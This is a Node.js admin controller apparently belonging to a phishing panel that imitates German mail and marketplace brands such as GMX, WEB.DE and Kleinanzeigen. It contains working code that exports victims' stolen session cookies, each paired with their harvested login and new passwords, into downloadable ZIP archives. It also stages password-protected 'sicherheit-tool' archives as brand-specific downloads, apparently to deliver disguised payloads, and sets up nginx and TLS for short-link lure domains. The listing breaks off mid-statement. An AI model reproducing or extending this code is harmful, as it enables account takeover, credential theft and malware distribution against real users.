// Controller: configs, downloads, cookies-export, mode/start-page (sloppy — uses with(scope)).
const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const { spawn, spawnSync } = require('child_process');
const { execSync } = require('child_process');
const yauzl = require('yauzl');
const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminAuth } = require('../utils/authUtils');
const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
const leadService = require('../services/leadService');
const automationService = require('../services/automationService');
const chatService = require('../services/chatService');
let nodemailer;
try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
const archiver = require('archiver');
const {
  getWebLoginAndNewPasswordForExport,
  formatCookieFileCommentLine,
} = require('../lib/leadExportCredentials');
const {
  listProxyFpStats,
  deleteProxyFpStatRow,
  deleteProxyFpStatsByProxy,
  deleteProxyFpStatsByFingerprint,
  purgeProxyFpStatsOrphans,
  getAllLeads,
} = require('../db/database');
const brandDomains = require('../config/brandDomains');
const { probeShortDomainHttp, probeShortLinkHttp } = require('../utils/shortDomainHttpProbe');
const { shortLinkRedirectMatchesTarget } = require('../utils/shortLinkTargetMatch');
const downloadKit = require('../services/downloadKitService');
const { handleDownloadConfigRoutes } = require('./admin/downloadController');
const { handleConfigEmailWarmupRoutes } = require('./admin/configEmailWarmupController');
const { handleConfigProxyFpStatsRoutes } = require('./admin/configProxyFpStatsController');
const { handleModeStatsRoutes } = require('./admin/modeStatsController');
const { handleConfigStealerEmailRoutes } = require('./admin/configStealerEmailController');
const { normalizeOptionalSchemeHttpUrl } = require('../utils/urlSchemeUtils');
const proxyAuthWebValidate = require('../utils/proxyAuthWebValidate');

/** https-proxy-agent v8 — только ESM: require() падает с ERR_PACKAGE_PATH_NOT_EXPORTED. */
let httpsProxyAgentCtorPromise = null;
function getHttpsProxyAgentCtor() {
  if (!httpsProxyAgentCtorPromise) {
    httpsProxyAgentCtorPromise = import('https-proxy-agent')
      .then(function (m) {
        return (m && m.HttpsProxyAgent) || null;
      })
      .catch(function () {
        return null;
      });
  }
  return httpsProxyAgentCtorPromise;
}

/** SOCKS5/4 для проверки прокси (HTTP CONNECT — только https-proxy-agent). */
let socksProxyAgentClassCache = null;
let socksProxyAgentLoadAttempted = false;
function getSocksProxyAgentClass() {
  if (socksProxyAgentLoadAttempted) return socksProxyAgentClassCache;
  socksProxyAgentLoadAttempted = true;
  try {
    socksProxyAgentClassCache = require('socks-proxy-agent').SocksProxyAgent;
  } catch (e) {
    socksProxyAgentClassCache = null;
  }
  return socksProxyAgentClassCache;
}

function normalizeAdminUiMode(value) {
  const mode = String(value || '').trim().toLowerCase();
  if (mode === 'email' || mode === 'klein' || mode === 'vint') return mode;
  return 'email';
}

/** Служебный slug для проверки домена сокращалки (не показывается в API списка ссылок). */
const SHORT_DOMAIN_PROBE_SLUG = '__gmwprobe';

const RESERVED_SHORT_PATH_SLUGS = new Set([
  'api', 's', 'admin', 'health', 'ping', 'gate-white', 'download', 'anmelden', 'einloggen',
  SHORT_DOMAIN_PROBE_SLUG,
  'klein-anmelden', 'passwort-aendern', 'klein-passwort-warnung', 'sicherheit', 'sicherheit-pc', 'sicherheit-update',
  'bitte-am-pc', 'app-update', 'erfolg', 'robots', 'favicon', 'static', 'public', 'assets',
  'webde', 'gmx', 'klein', 'cgi-bin', 'www'
]);

function isValidShortPathRedirectUrl(u) {
  return !!normalizeOptionalSchemeHttpUrl(u);
}

function generateUniquePathSlug(pathLinks) {
  const existing = pathLinks && typeof pathLinks === 'object' ? pathLinks : {};
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  for (let attempt = 0; attempt < 32; attempt++) {
    let slug = '';
    const bytes = crypto.randomBytes(12);
    for (let i = 0; i < 7; i++) slug += chars[bytes[i] % chars.length];
    if (RESERVED_SHORT_PATH_SLUGS.has(slug) || existing[slug]) continue;
    return slug;
  }
  return crypto.randomBytes(6).toString('hex');
}

function pathLinksForApi(domain, pathLinks) {
  const o = pathLinks && typeof pathLinks === 'object' ? pathLinks : {};
  return Object.keys(o)
    .filter(function (slug) {
      const row = o[slug];
      return !(row && row._gmwProbe);
    })
    .map(function (slug) {
      const row = o[slug];
      const url = row && row.url ? String(row.url) : '';
      return { slug: slug, url: url, shortUrl: 'https://' + domain + '/' + slug };
    });
}

/** Самая свежая пользовательская короткая ссылка для проверки домена (без служебного __gmwprobe). */
function pickNewestUserShortSlug(pathLinks) {
  const o = pathLinks && typeof pathLinks === 'object' ? pathLinks : {};
  const keys = Object.keys(o).filter(function (slug) {
    const row = o[slug];
    if (!row || row._gmwProbe) return false;
    const u = (row.url || '').trim();
    return !!(normalizeOptionalSchemeHttpUrl(u) || /^https?:\/\//i.test(u));
  });
  if (keys.length === 0) return null;
  let bestSlug = keys[0];
  let bestAt = '';
  for (let i = 0; i < keys.length; i++) {
    const slug = keys[i];
    const t = String((o[slug] && o[slug].createdAt) || '');
    if (t >= bestAt) {
      bestAt = t;
      bestSlug = slug;
    }
  }
  const rawU = (o[bestSlug].url || '').trim();
  return { slug: bestSlug, expectedUrl: normalizeOptionalSchemeHttpUrl(rawU) || rawU };
}

/** ZIP без системной команды `zip` (на многих VPS её нет → «Ошибка создания архива»). */
function zipFlatDirectoryToFile(dirPath, outZipPath) {
  return new Promise(function (resolve, reject) {
    const archive = archiver('zip', { zlib: { level: 6 } });
    const output = fs.createWriteStream(outZipPath);
    output.on('close', function () {
      resolve();
    });
    output.on('error', reject);
    archive.on('error', reject);
    archive.pipe(output);
    let names;
    try {
      names = fs.readdirSync(dirPath);
    } catch (e) {
      reject(e);
      return;
    }
    for (let i = 0; i < names.length; i++) {
      const f = names[i];
      const fp = path.join(dirPath, f);
      let st;
      try {
        st = fs.statSync(fp);
      } catch (e) {
        continue;
      }
      if (st.isFile()) archive.file(fp, { name: f });
    }
    void archive.finalize();
  });
}

function runShortDomainNginxRemoveSync(domain, projectRoot) {
  const script = path.join(projectRoot, 'scripts', 'remove-short-domain-nginx.sh');
  if (!fs.existsSync(script)) {
    return { ok: false, detail: 'remove-short-domain-nginx.sh не найден' };
  }
  const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
  const r = isRoot
    ? spawnSync('/bin/bash', [script, domain], { cwd: projectRoot, encoding: 'utf8', timeout: 120000, env: process.env })
    : spawnSync('sudo', ['-n', '/bin/bash', script, domain], { cwd: projectRoot, encoding: 'utf8', timeout: 120000, env: process.env });
  const out = ((r.stdout || '') + '\n' + (r.stderr || '')).trim();
  return { ok: r.status === 0, status: r.status, out: out || undefined, spawnError: r.error };
}

function certbotNoWwwFromEnv() {
  return /^1|true|yes$/i.test(
    String(process.env.CERTBOT_NO_WWW || process.env.BRAND_DOMAIN_SSL_NO_WWW || '').trim()
  );
}

/** Отдельный Let's Encrypt на origin для каждого домена; иначе только при осознанном ALLOW_HTTP_ONLY_NGINX. */
function nginxSslPrerequisiteOk() {
  if (/^1|true|yes$/i.test(String(process.env.SHORT_DOMAIN_SKIP_NGINX || '').trim())) return true;
  if (/^1|true|yes$/i.test(String(process.env.ALLOW_HTTP_ONLY_NGINX || '').trim())) return true;
  return !!String(process.env.CERTBOT_EMAIL || '').trim();
}

function buildSetupShortDomainNginxArgs(domain, port, projectRoot) {
  const setupScript = path.join(projectRoot, 'scripts', 'setup-short-domain-nginx.sh');
  const args = [setupScript];
  if (certbotNoWwwFromEnv()) args.push('--no-www');
  const httpOnly = /^1|true|yes$/i.test(String(process.env.ALLOW_HTTP_ONLY_NGINX || '').trim());
  if (httpOnly) {
    args.push('--no-ssl', domain, port);
    return { setupScript, args };
  }
  args.push('--ssl', '--email', String(process.env.CERTBOT_EMAIL || '').trim(), domain, port);
  return { setupScript, args };
}

function triggerShortDomainNginxProvision(domain, projectRoot) {
  if (/^1|true|yes$/i.test(String(process.env.SHORT_DOMAIN_SKIP_NGINX || '').trim())) return;
  const httpOnly = /^1|true|yes$/i.test(String(process.env.ALLOW_HTTP_ONLY_NGINX || '').trim());
  const email = String(process.env.CERTBOT_EMAIL || '').trim();
  if (!email && !httpOnly) {
    console.warn(
      '[short-domains] CERTBOT_EMAIL не задан — nginx не запускается (отдельный LE на домен). ALLOW_HTTP_ONLY_NGINX=1 — только HTTP.'
    );
    return;
  }
  const port = String(process.env.PORT || '3001').trim() || '3001';
  const { setupScript, args } = buildSetupShortDomainNginxArgs(domain, port, projectRoot);
  if (!fs.existsSync(setupScript)) return;
  const env = Object.assign({}, process.env);
  if (!env.SHORT_DOMAIN_STOP_APACHE) env.SHORT_DOMAIN_STOP_APACHE = '1';
  const ddef = String(env.SHORT_NGINX_DISABLE_DEFAULT || '').trim();
  if (!ddef) env.SHORT_NGINX_DISABLE_DEFAULT = '1';
  const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
  try {
    const child = isRoot
      ? spawn('/bin/bash', args, { detached: true, stdio: 'ignore', cwd: projectRoot, env: env })
      : spawn('sudo', ['-n', '/bin/bash'].concat(args), { detached: true, stdio: 'ignore', cwd: projectRoot, env: env });
    if (child && child.pid) child.unref();
    console.log('[short-domains] nginx provision запущен для', domain, 'pid=', child ? child.pid : '?');
  } catch (e) {
    console.warn('[short-domains] provision spawn:', e && e.message ? e.message : e);
  }
}

/** Синхронно: vhost + SSL (как short-домены), чтобы админка показала ✓/✕. */
function runBrandDomainNginxProvisionSync(domain, projectRoot) {
  const d = String(domain || '')
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, '')
    .split('/')[0]
    .replace(/^www\./, '');
  if (!d) {
    return { ok: false, skipped: false, message: 'пустой домен' };
  }
  if (/^1|true|yes$/i.test(String(process.env.SHORT_DOMAIN_SKIP_NGINX || '').trim())) {
    return { ok: true, skipped: true, message: 'SHORT_DOMAIN_SKIP_NGINX' };
  }
  const httpOnly = /^1|true|yes$/i.test(String(process.env.ALLOW_HTTP_ONLY_NGINX || '').trim());
  const email = String(process.env.CERTBOT_EMAIL || '').trim();
  if (!email && !httpOnly) {
    return { ok: true, skipped: true, message: 'CERTBOT_EMAIL не задан — Nginx не запускался' };
  }
  const setupScript = path.join(projectRoot, 'scripts', 'setup-short-domain-nginx.sh');
  if (!fs.existsSync(setupScript)) {
    return { ok: false, skipped: false, message: 'setup-short-domain-nginx.sh не найден' };
  }
  const port = String(process.env.PORT || '3001').trim() || '3001';
  const env = Object.assign({}, process.env);
  if (!env.SHORT_DOMAIN_STOP_APACHE) env.SHORT_DOMAIN_STOP_APACHE = '1';
  const ddefSync = String(env.SHORT_NGINX_DISABLE_DEFAULT || '').trim();
  if (!ddefSync) env.SHORT_NGINX_DISABLE_DEFAULT = '1';
  const { args: bashArgs } = buildSetupShortDomainNginxArgs(d, port, projectRoot);
  const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
  const opts = { cwd: projectRoot, encoding: 'utf8', timeout: 600000, env: env, maxBuffer: 12 * 1024 * 1024 };
  let r;
  try {
    r = isRoot
      ? spawnSync('/bin/bash', bashArgs, opts)
      : spawnSync('sudo', ['-n', '/bin/bash'].concat(bashArgs), opts);
  } catch (e) {
    return { ok: false, skipped: false, message: (e && e.message) || String(e) };
  }
  const out = ((r.stdout || '') + '\n' + (r.stderr || '')).trim();
  if (r.error) {
    return { ok: false, skipped: false, message: r.error.message || String(r.error), out: out || undefined };
  }
  if (r.signal) {
    return { ok: false, skipped: false, message: 'signal ' + r.signal, out: out || undefined };
  }
  return {
    ok: r.status === 0,
    skipped: false,
    status: r.status,
    out: out ? out.slice(0, 8000) : undefined
  };
}

async function handle(scope) {
  scope = Object.assign({ checkAdminAuth, send }, scope);
  with (scope) {
  if (handleConfigProxyFpStatsRoutes(Object.assign({}, scope, {
    listProxyFpStats,
    deleteProxyFpStatRow,
    deleteProxyFpStatsByProxy,
    deleteProxyFpStatsByFingerprint,
    purgeProxyFpStatsOrphans,
    normalizeProxyLine,
  }))) return true;

  if (pathname === '/api/config/cookies-export' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const mode = (parsed.query && parsed.query.mode) ? String(parsed.query.mode).trim().toLowerCase() : 'all';
    if (mode !== 'all' && mode !== 'new' && mode !== 'force') return send(res, 400, { ok: false, error: 'mode=all|new|force' });
    /** readLeads() — operational rows без колонки cookies; для ZIP нужны полные строки из БД. */
    const leads = getAllLeads();
    const cookieExportSets = readCookiesExportedSets();
    function cookieSafeFromEmailForExport(email) {
      if (!email || typeof email !== 'string') return '';
      return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
    }
    const withCookies = leads.filter((l) => {
      const c = l && l.cookies;
      return c != null && String(c).trim() !== '';
    });
    const toExport = (mode === 'new') ? withCookies.filter((l) => {
      const safe = cookieSafeFromEmailForExport(cookieEmailForLeadCookiesFile(l));
      return !cookieExportSets.leadIds.has(String(l.id)) && !cookieExportSets.safeNames.has(safe);
    }) : withCookies;
    if (toExport.length === 0) {
      return send(res, 200, { ok: false, error: mode === 'new' ? 'Нет новых куки для выгрузки' : 'Нет куки в БД' });
    }
    const skipMarkExported = (mode === 'force');
    const tempDir = path.join(os.tmpdir(), 'gmw-cookies-export-' + Date.now());
    const zipPath = path.join(os.tmpdir(), 'gmw-cookies-export-' + Date.now() + '.zip');
    try {
      fs.mkdirSync(tempDir, { recursive: true });
      const exportedLeadIds = [];
      for (const lead of toExport) {
        const email = cookieEmailForLeadCookiesFile(lead) || (lead.email || '').trim() || 'unknown';
        const { passLogin, passNew } = getWebLoginAndNewPasswordForExport(lead);
        const commentLine = formatCookieFileCommentLine(email, passLogin, passNew);
        const cookieData = String(lead.cookies).trim();
        const txtContent = commentLine + '\n' + cookieData;
        const txtFileName = cookieExportFilename(email);
        fs.writeFileSync(path.join(tempDir, txtFileName), txtContent, 'utf8');
        exportedLeadIds.push(String(lead.id));
      }
      try {
        await zipFlatDirectoryToFile(tempDir, zipPath);
      } catch (zipErr) {
        console.error('[АДМИН] cookies-export zip error:', zipErr && zipErr.message ? zipErr.message : zipErr);
        try { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true }); } catch (e2) {}
        try { if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); } catch (e2) {}
        return send(res, 500, { ok: false, error: 'Ошибка создания архива' });
      }
      if (!skipMarkExported) appendCookiesExportedLeadIds(exportedLeadIds);
      try { fs.rmSync(tempDir, { recursive: true }); } catch (e) {}
      const filename = mode === 'new' ? 'cookies-new.zip' : (mode === 'force' ? 'cookies-force.zip' : 'cookies-all.zip');
      res.writeHead(200, {
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename="' + filename + '"',
        'Cache-Control': 'no-store'
      });
      const stream = fs.createReadStream(zipPath);
      stream.pipe(res);
      stream.on('end', () => {
        try { fs.unlinkSync(zipPath); } catch (e) {}
      });
      res.on('close', () => {
        try { fs.unlinkSync(zipPath); } catch (e) {}
      });
    } catch (e) {
      console.error('[АДМИН] cookies-export:', e);
      try { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true }); } catch (e2) {}
      try { if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath); } catch (e2) {}
      return send(res, 500, { ok: false, error: String(e.message || e) });
    }
    return true;
  }

  if (handleModeStatsRoutes(Object.assign({}, scope, {
    leadService,
    normalizeAdminUiMode,
  }))) return true;

  if (handleDownloadConfigRoutes(scope)) return true;

  if (pathname === '/api/config/check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let zipPassword = '';
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) { fileStart = bodyStart; fileEnd = partEnd; }
          } else if (nameMatch && nameMatch[1] === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const safeName = path.basename(filename) || 'download';
      const checkId = Date.now() + '-' + Math.random().toString(36).slice(2, 10);
      const targetPath = path.join(CHECK_DIR, checkId);
      try {
        if (!fs.existsSync(CHECK_DIR)) fs.mkdirSync(CHECK_DIR, { recursive: true });
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const meta = readCheckMeta();
        meta[checkId] = { name: safeName };
        writeCheckMeta(meta);
        const result = { ok: true, fileName: safeName, checkId };
        if (path.extname(safeName).toLowerCase() !== '.zip') {
          return send(res, 200, result);
        }
        let responded = false;
        const finishWithEntries = (entries) => {
          if (responded) return;
          responded = true;
          result.zipEntries = Array.isArray(entries) ? entries.filter(n => n && !n.endsWith('/')) : [];
          send(res, 200, result);
        };
        const parseUnzipList = (out) => {
          const entries = [];
          const lines = (out || '').split('\n');
          let inTable = false;
          for (const line of lines) {
            if (line.includes('-------')) { inTable = !inTable; continue; }
            let name = null;
            const m = inTable && line.match(/^\s*\d+\s+\S+\s+\S+\s+(.*)$/);
            if (m) name = m[1].trim();
            else if (inTable && /^\s*\d+/.test(line)) {
              const parts = line.trim().split(/\s{2,}/);
              if (parts.length >= 4 && /^\d+$/.test(parts[0])) name = parts.slice(3).join(' ').trim();
            }
            if (name && !/^\d+ files?$/.test(name) && !name.endsWith('/')) entries.push(name);
          }
          return entries;
        };
        const runUnzip = (usePassword) => {
          const env = usePassword ? { ...process.env, GMW_ZIP_OLD: zipPassword } : process.env;
          const cmd = usePassword
            ? 'unzip -l -P "$GMW_ZIP_OLD" ' + JSON.stringify(targetPath) + ' 2>&1'
            : 'unzip -l ' + JSON.stringify(targetPath) + ' 2>&1';
          const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', cmd], { encoding: 'utf8', env });
          return (r.stdout || '') + (r.stderr || '');
        };
        let out = runUnzip(!!zipPassword);
        let list = parseUnzipList(out);
        if (list.length === 0 && zipPassword) out = runUnzip(false);
        if (list.length === 0) list = parseUnzipList(out);
        finishWithEntries(list);
      } catch (e) {
        try { if (fs.existsSync(targetPath)) fs.unlinkSync(targetPath); } catch (e2) {}
        const meta = readCheckMeta();
        delete meta[checkId];
        writeCheckMeta(meta);
        send(res, 500, { ok: false, error: (e && e.message) || 'Server error' });
      }
    });
    return true;
  }

  if (pathname === '/api/config/upload-apply' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const checkId = (json.checkId || '').trim();
      const slotIndex = json.slotIndex != null ? parseInt(json.slotIndex, 10) : -1;
      const useSlot = slotIndex >= 0 && slotIndex < DOWNLOAD_SLOTS_COUNT;
      const meta = readCheckMeta();
      const info = checkId ? meta[checkId] : null;
      const sourcePath = checkId ? path.join(CHECK_DIR, checkId) : null;
      if (!checkId || !info || !sourcePath || !fs.existsSync(sourcePath)) {
        return send(res, 400, { ok: false, error: 'Сначала нажмите Check и загрузите файл' });
      }
      const safeName = info.name;
      const isZip = path.extname(safeName).toLowerCase() === '.zip';
      const asIs = json.asIs === true;
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      let newZipName = (json.newZipName || '').trim().replace(/[^a-zA-Z0-9._-]/g, '') || 'sicherheit-tool.zip';
      if (!newZipName.toLowerCase().endsWith('.zip')) newZipName += '.zip';
      const renames = json.renames && typeof json.renames === 'object' ? json.renames : {};
      const applyBrand = downloadKit.normalizeDownloadKitBrand(json.downloadBrand != null ? json.downloadBrand : json.brand);
      /** Имя файла для слота с префиксом бренда (gmx_sicherheit-0.zip …). */
      function slotFileName(idx, ext) {
        return applyBrand + '_sicherheit-' + idx + (ext || path.extname(safeName) || '');
      }
      function applyToSlot(finalFileName) {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        const finalPath = path.join(DOWNLOADS_DIR, finalFileName);
        fs.copyFileSync(sourcePath, finalPath);
        const config = downloadKit.readDownloadFilesConfigForBrand(applyBrand);
        config[slotIndex] = finalFileName;
        downloadKit.writeDownloadFilesConfigForBrand(applyBrand, config);
        try {
          if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
          delete meta[checkId];
          writeCheckMeta(meta);
        } catch (e) {}
        send(res, 200, { ok: true, fileName: finalFileName });
      }
      try {
        if (isZip && asIs && useSlot) {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const finalFileName = slotFileName(slotIndex, '.zip');
          fs.copyFileSync(sourcePath, path.join(DOWNLOADS_DIR, finalFileName));
          if (currentPassword && typeof writeZipPasswordForBrand === 'function') {
            writeZipPasswordForBrand(applyBrand, currentPassword);
          }
          const config = downloadKit.readDownloadFilesConfigForBrand(applyBrand);
          config[slotIndex] = finalFileName;
          downloadKit.writeDownloadFilesConfigForBrand(applyBrand, config);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else if (isZip && asIs) {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if (lower.endsWith('.exe') || lower.endsWith('.zip')) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          const finalPath = path.join(DOWNLOADS_DIR, safeName);
          fs.copyFileSync(sourcePath, finalPath);
          if (currentPassword && typeof writeZipPasswordForBrand === 'function') {
            writeZipPasswordForBrand(applyBrand, currentPassword);
          }
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: safeName });
        } else if (isZip && useSlot) {
          const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
          const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
          fs.mkdirSync(tempDir, { recursive: true });
          const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
          const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
          const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
          if (fs.readdirSync(tempDir).length === 0) {
            const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
            const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
            return send(res, 500, { ok: false, error: friendly });
          }
          const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
          function safeSegment(name) {
            const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
            return s || null;
          }
          for (const r of renameList) {
            const from = safeSegment(r.from || r[0] || '');
            const to = safeSegment(r.to || r[1] || '');
            if (!from || !to || from === to) continue;
            const oldP = path.join(tempDir, from);
            const newP = path.join(tempDir, to);
            if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
            if (fs.existsSync(oldP)) fs.renameSync(oldP, newP);
          }
          const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
          execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
          const finalFileName = slotFileName(slotIndex, '.zip');
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(outZipPath, path.join(DOWNLOADS_DIR, finalFileName));
          const config = downloadKit.readDownloadFilesConfigForBrand(applyBrand);
          config[slotIndex] = finalFileName;
          downloadKit.writeDownloadFilesConfigForBrand(applyBrand, config);
          if (typeof writeZipPasswordForBrand === 'function') writeZipPasswordForBrand(applyBrand, newPassword);
          try {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
            if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
          } catch (e) {}
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else if (isZip) {
          const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
          const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
          fs.mkdirSync(tempDir, { recursive: true });
          const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
          const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
          const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
          if (fs.readdirSync(tempDir).length === 0) {
            const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
            const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
            return send(res, 500, { ok: false, error: friendly });
          }
          const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
          function safeSegment(name) {
            const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
            return s || null;
          }
          for (const r of renameList) {
            const from = safeSegment(r.from || r[0] || '');
            const to = safeSegment(r.to || r[1] || '');
            if (!from || !to || from === to) continue;
            const oldP = path.join(tempDir, from);
            const newP = path.join(tempDir, to);
            if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
            if (fs.existsSync(oldP)) fs.renameSync(oldP, newP);
          }
          const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
          execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
          const finalPath = path.join(DOWNLOADS_DIR, newZipName);
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(outZipPath, finalPath);
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== newZipName) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          if (typeof writeZipPasswordForBrand === 'function') writeZipPasswordForBrand(applyBrand, newPassword);
          try {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
            if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
          } catch (e) {}
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: newZipName });
        } else if (useSlot) {
          const finalFileName = slotFileName(slotIndex);
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(sourcePath, path.join(DOWNLOADS_DIR, finalFileName));
          const config = downloadKit.readDownloadFilesConfigForBrand(applyBrand);
          config[slotIndex] = finalFileName;
          downloadKit.writeDownloadFilesConfigForBrand(applyBrand, config);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
